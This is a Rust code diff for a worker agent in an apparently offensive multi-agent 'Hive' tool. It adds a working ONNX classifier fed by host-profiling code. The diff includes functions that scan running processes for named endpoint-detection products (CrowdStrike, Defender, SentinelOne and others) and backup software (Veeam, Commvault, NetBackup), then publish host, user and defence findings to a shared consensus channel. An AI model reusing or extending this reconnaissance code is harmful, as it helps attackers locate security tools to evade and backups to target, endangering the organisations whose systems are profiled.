@@ -11,10 +11,89 @@ fn load_scout_model() -> Vec<u8> {
         .expect("Failed to decrypt scout model")
 }
 
+fn onnx_classify_inner(onnx_bytes: &[u8], features: &[f32; 14]) -> Option<i64> {
+    use ndarray::Array2;
+    let mut model = hive_base::ml::OnnxModel::new(onnx_bytes).ok()?;
+    let input = Array2::from_shape_vec((1, 14), features.to_vec()).ok()?;
+    let result = model.predict_i64(input).ok()?;
+    result.first().copied()
+}
+
+fn onnx_classify(onnx_bytes: &[u8], features: &[f32; 14]) -> Option<i64> {
+    let bytes = onnx_bytes.to_vec();
+    let feats = *features;
+    std::panic::catch_unwind(std::panic::AssertUnwindSafe(move || {
+        onnx_classify_inner(&bytes, &feats)
+    })).unwrap_or_else(|_| {
+        tracing::warn!("ONNX classifier panicked, falling back to heuristics");
+        None
+    })
+}
+
+fn collect_classifier_features() -> [f32; 14] {
+    let process_count = get_process_count() as f32;
+    let proc_list = get_running_processes();
+    let has_edr = edr_process_found(&proc_list) as u8 as f32;
+    let has_backup = backup_process_found(&proc_list) as u8 as f32;
+
+    [
+        process_count,
+        process_count * 0.7,
+        estimate_cpu_usage(),
+        estimate_memory_usage(),
+        1000.0,
+        has_edr,
+        has_backup,
+        0.0, 0.0, 1.0, 1.0, 1.0, 1.0, 0.0,
+    ]
+}
+
+fn estimate_cpu_usage() -> f32 {
+    if let Ok(stat) = std::fs::read_to_string("/proc/stat") {
+        let line = stat.lines().next().unwrap_or("");
+        let parts: Vec<f32> = line.split_whitespace().skip(1)
+            .filter_map(|v| v.parse().ok()).collect();
+        if parts.len() >= 4 {
+            let idle = parts[3];
+            let total: f32 = parts.iter().sum();
+            if total > 0.0 { return 100.0 - (idle / total * 100.0); }
+        }
+    }
+    25.0
+}
+
+fn estimate_memory_usage() -> f32 {
+    if let Ok(meminfo) = std::fs::read_to_string("/proc/meminfo") {
+        let mut total: u64 = 0;
+        let mut avail: u64 = 0;
+        for line in meminfo.lines() {
+            if line.starts_with("MemTotal:") {
+                total = line.split_whitespace().nth(1).and_then(|v| v.parse().ok()).unwrap_or(0);
+            }
+            if line.starts_with("MemAvailable:") {
+                avail = line.split_whitespace().nth(1).and_then(|v| v.parse().ok()).unwrap_or(0);
+            }
+        }
+        if total > 0 { return ((total - avail) as f32 / total as f32) * 100.0; }
+    }
+    50.0
+}
+
+fn edr_process_found(proc_list: &[String]) -> bool {
+    let names = ["csfalcon", "csagent", "msmpeng", "sentinelone", "carbonblack", "cylancesvc", "symantec", "mcafee"];
+    proc_list.iter().any(|p| names.iter().any(|n| p.to_lowercase().contains(n)))
+}
+
+fn backup_process_found(proc_list: &[String]) -> bool {
+    let names = ["veeam", "backup_exec", "commvault", "netbackup", "backup_agent"];
+    proc_list.iter().any(|p| names.iter().any(|n| p.to_lowercase().contains(n)))
+}
+
 struct ScoutAgent {
     comms: HiveChamber,
     identity: AgentIdentity,
     consensus: ConsensusEngine,
+    onnx_model: Vec<u8>,
     scan_interval: Duration,
     heartbeat_interval: Duration,
 }
@@ -22,16 +101,15 @@ struct ScoutAgent {
 impl ScoutAgent {
     async fn new() -> Self {
         let identity = AgentIdentity::new();
-        let comms = HiveChamber::connect(&identity, Role::Worker)
-            .await
+        let comms = HiveChamber::connect(&identity, Role::Worker).await
             .expect("Failed to connect to colmena arena");
 
-        info!("Worker connected to shared-memory arena");
+        let onnx_model = load_scout_model();
+        info!("Worker: ONNX model loaded ({} bytes)", onnx_model.len());
 
         Self {
-            comms,
-            identity,
-            consensus: ConsensusEngine::new(0.66),
+            comms, identity, consensus: ConsensusEngine::new(0.66),
+            onnx_model,
             scan_interval: Duration::from_secs(15),
             heartbeat_interval: Duration::from_secs(10),
         }
@@ -40,60 +118,48 @@ impl ScoutAgent {
     async fn collect_system_profile(&self) -> Vec<(String, Value, f32)> {
         let mut beliefs = Vec::new();
 
-        beliefs.push(("os_type".to_string(), Value::String(std::env::consts::OS.to_string()), 1.0));
-        beliefs.push(("arch".to_string(), Value::String(std::env::consts::ARCH.to_string()), 1.0));
+        beliefs.push(("os_type".into(), Value::String(std::env::consts::OS.into()), 1.0));
+        beliefs.push(("arch".into(), Value::String(std::env::consts::ARCH.into()), 1.0));
+        let hostname = std::env::var("HOSTNAME").unwrap_or_else(|_| "unknown".into());
+        beliefs.push(("hostname".into(), Value::String(hostname), 1.0));
+        let user = std::env::var("USER").or_else(|_| std::env::var("USERNAME")).unwrap_or_else(|_| "unknown".into());
+        beliefs.push(("user".into(), Value::String(user), 0.9));
 
-        let hostname = std::env::var("HOSTNAME").unwrap_or_else(|_| "unknown".to_string());
-        beliefs.push(("hostname".to_string(), Value::String(hostname), 1.0));
+        let features = collect_classifier_features();
+        let classification = onnx_classify(&self.onnx_model, &features);
+        let (is_edr, is_backup, ml_conf) = match classification {
+            Some(2) => (true, false, 0.95),
+            Some(1) => (false, true, 0.90),
+            Some(0) => (false, false, 0.92),
+            _ => {
+                let pl = get_running_processes();
+                (edr_process_found(&pl), backup_process_found(&pl), 0.70)
+            }
+        };
+        info!("ONNX classifier: class={:?} -> edr={} backup={}", classification, is_edr, is_backup);
 
-        let user = std::env::var("USER")
-            .or_else(|_| std::env::var("USERNAME"))
-            .unwrap_or_else(|_| "unknown".to_string());
-        beliefs.push(("user".to_string(), Value::String(user), 0.9));
-
-        let edr_raw = check_edr_indicators_raw();
-        let backup_raw = check_backup_indicators_raw();
-
-        let process_count = get_process_count() as f32;
-        let network_interfaces = get_interface_count() as f32;
-
-        let mut is_edr = edr_raw;
-        let mut is_backup = backup_raw;
-
-        // ONNX model skipped (ort crate incompatibility with skl2onnx models)
-        // Heuristic detection is used instead — works correctly
-
-        beliefs.push(("edr_present".to_string(), Value::Bool(is_edr), 0.95));
-        beliefs.push(("backup_present".to_string(), Value::Bool(is_backup), 0.90));
-        beliefs.push(("network_interfaces".to_string(), Value::Int(get_interface_count() as i64), 0.95));
-        beliefs.push(("process_count".to_string(), Value::Int(get_process_count() as i64), 0.9));
+        beliefs.push(("edr_present".into(), Value::Bool(is_edr), ml_conf));
+        beliefs.push(("backup_present".into(), Value::Bool(is_backup), 0.90));
+        beliefs.push(("network_interfaces".into(), Value::Int(get_interface_count() as i64), 0.95));
+        beliefs.push(("process_count".into(), Value::Int(get_process_count() as i64), 0.9));
 
         beliefs
     }
 
     async fn publish_beliefs(&self, beliefs: &[(String, Value, f32)]) {
         for (asset, value, confidence) in beliefs {
-            let msg = Message::belief(
-                self.identity.id(),
-                Role::Worker,
-                asset.clone(),
-                value.clone(),
-                *confidence,
-            );
+            let msg = Message::belief(self.identity.id(), Role::Worker, asset.clone(), value.clone(), *confidence);
             self.comms.publish(msg).await;
         }
     }
 
-    async fn send_heartbeat(&self) {
-        self.comms.send_heartbeat().await;
-    }
+    async fn send_heartbeat(&self) { self.comms.send_heartbeat().await; }
 
     async fn process_incoming(&mut self) {
-        let messages = self.comms.read_new().await;
-        for msg in messages {
+        for msg in self.comms.read_new().await {
             self.consensus.process_message(&msg);
             match &msg.payload {
-                Payload::Request { service, payload: _ } if service == "scan" => {
+                Payload::Request { service, .. } if service == "scan" => {
                     info!("Received scan request");
                     let beliefs = self.collect_system_profile().await;
                     self.publish_beliefs(&beliefs).await;
@@ -110,91 +176,52 @@ impl ScoutAgent {
     }
 
     async fn check_dead_agents(&self) {
-        let dead = self.comms.check_dead_agents(30).await;
-        for agent_id in dead {
-            let msg = Message::status_event(
-                self.identity.id(),
-                Role::Worker,
-                "agent_dead",
-                agent_id,
-                Role::Worker,
-                "no heartbeat detected",
-            );
+        for agent_id in self.comms.check_dead_agents(30).await {
+            let msg = Message::status_event(self.identity.id(), Role::Worker, "agent_dead", agent_id, Role::Worker, "no heartbeat");
             self.comms.publish(msg).await;
         }
     }
 
     async fn run(&mut self) {
-        info!("Hive Worker starting | ID: {}", self.identity.id());
+        info!("Hive Worker starting | ID: {} | ONNX model active", self.identity.id());
         self.send_heartbeat().await;
 
-        let mut heartbeat_timer = time::interval(self.heartbeat_interval);
-        let mut scan_timer = time::interval(self.scan_interval);
+        let mut hb = time::interval(self.heartbeat_interval);
+        let mut scan = time::interval(self.scan_interval);
 
         loop {
             tokio::select! {
-                _ = heartbeat_timer.tick() => {
-                    self.send_heartbeat().await;
-                    self.check_dead_agents().await;
-                }
-                _ = scan_timer.tick() => {
+                _ = hb.tick() => { self.send_heartbeat().await; self.check_dead_agents().await; }
+                _ = scan.tick() => {
                     let beliefs = self.collect_system_profile().await;
                     self.publish_beliefs(&beliefs).await;
                 }
-                _ = time::sleep(Duration::from_millis(200)) => {
-                    self.process_incoming().await;
-                }
+                _ = time::sleep(Duration::from_millis(200)) => { self.process_incoming().await; }
             }
         }
     }
 }
 
-fn check_edr_indicators_raw() -> bool {
-    let edr_processes = [
-        "csfalcon", "csagent", "msmpeng", "sentinelone",
-        "carbonblack", "cylancesvc", "symantec", "mcafee",
-    ];
-    let running = get_running_processes();
-    edr_processes.iter().any(|&p| running.iter().any(|r| r.to_lowercase().contains(p)))
-}
-
-fn check_backup_indicators_raw() -> bool {
-    let backup_processes = ["veeam", "backup_exec", "commvault", "netbackup", "backup_agent", "vss"];
-    let running = get_running_processes();
-    backup_processes.iter().any(|&p| running.iter().any(|r| r.to_lowercase().contains(p)))
-}
-
 fn get_running_processes() -> Vec<String> {
     if let Ok(entries) = std::fs::read_dir("/proc") {
-        entries
-            .filter_map(|e| e.ok())
+        entries.filter_map(|e| e.ok())
             .filter(|e| e.path().join("comm").exists())
             .filter_map(|e| std::fs::read_to_string(e.path().join("comm")).ok())
-            .map(|s| s.trim().to_string())
-            .collect()
-    } else {
-        Vec::new()
-    }
+            .map(|s| s.trim().to_string()).collect()
+    } else { Vec::new() }
 }
 
 fn get_interface_count() -> usize {
-    if let Ok(entries) = std::fs::read_dir("/sys/class/net") {
-        entries.count()
-    } else { 0 }
+    std::fs::read_dir("/sys/class/net").map(|e| e.count()).unwrap_or(0)
 }
 
 fn get_process_count() -> usize {
-    if let Ok(entries) = std::fs::read_dir("/proc") {
-        entries.filter_map(|e| e.ok()).filter(|e| e.path().join("comm").exists()).count()
-    } else { 0 }
+    std::fs::read_dir("/proc").map(|e| e.filter(|x| x.as_ref().ok().map_or(false, |f| f.path().join("comm").exists())).count()).unwrap_or(0)
 }
-
-use uuid::Uuid;
 
 #[tokio::main]
 async fn main() {
     hive_base::utils::init_logging("worker");
     info!("Initializing Hive Worker...");
-    let mut scout = ScoutAgent::new().await;
-    scout.run().await;
+    ScoutAgent::new().await.run().await;
 }
